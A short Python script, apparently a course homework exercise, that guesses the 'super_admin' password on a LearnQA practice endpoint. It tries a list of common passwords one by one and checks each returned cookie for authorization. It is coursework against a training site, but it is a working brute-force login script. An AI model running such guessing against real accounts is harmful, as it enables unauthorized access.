import requests

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

# List of unique passwords
passwords = [
    "password",
    "welcome",
    "123456",
    "12345678",
    "qwerty",
    "abc123",
    "12345",
    "football",
    "monkey",
    "123456789",
    "1234567",
    "letmein",
    "dragon",
    "trustno1",
    "baseball",
    "iloveyou",
    "master",
    "sunshine",
    "ashley",
    "bailey",
    "passw0rd",
    "shadow",
    "123123",
    "654321",
    "superman",
    "qazwsx",
    "michael",
    "Football",
    "photoshop",
    "password1",
    "sunshine1",
    "adobe123[a]",
    "photoshop[a]",
    "access",
    "batman",
    "charlie",
    "donald",
    "flower",
    "freedom",
    "hello",
    "hottie",
    "jesus",
    "loveme",
    "ninja",
    "princess",
    "qa123456",
    "solo",
    "starwars",
    "welcome",
    "welcome0",
    "whatever",
    "zaq1zaq1",
    "1q2w3e4r",
    "1qaz2wsx",
    "!@#$%^&*",
    "111111",
    "1234",
    "1234567",
    "12345678",
    "123456789",
    "1234567890",
    "123123123",
    "123321",
    "123qwe",
    "666666",
    "7777777",
    "888888"
]

# Flag to indicate if authorized
authorized = False

# Loop through each password and make a POST request
for password in passwords:
    try:
        # Make a POST request with the login and password
        response = requests.post(url, data={"login": "super_admin", "password": password})

        # Print the password text and the cookie
        print(f"Tried password: {password}")
        print(response.text)
        print(response.cookies)

        # Call URL2 after each password attempt
        response2 = requests.post(url2, cookies=response.cookies)
        print(response2.text)
        print(response2.cookies)

        # Check if the response2 contains "You are authorized"
        if "You are authorized" in response2.text:
            print("Authorization successful!")
            authorized = True
            break  # Exit the loop if authorized

    except Exception as e:
        print(f"Error occurred: {e}")

if not authorized:
    print("Authorization unsuccessful for all passwords.")
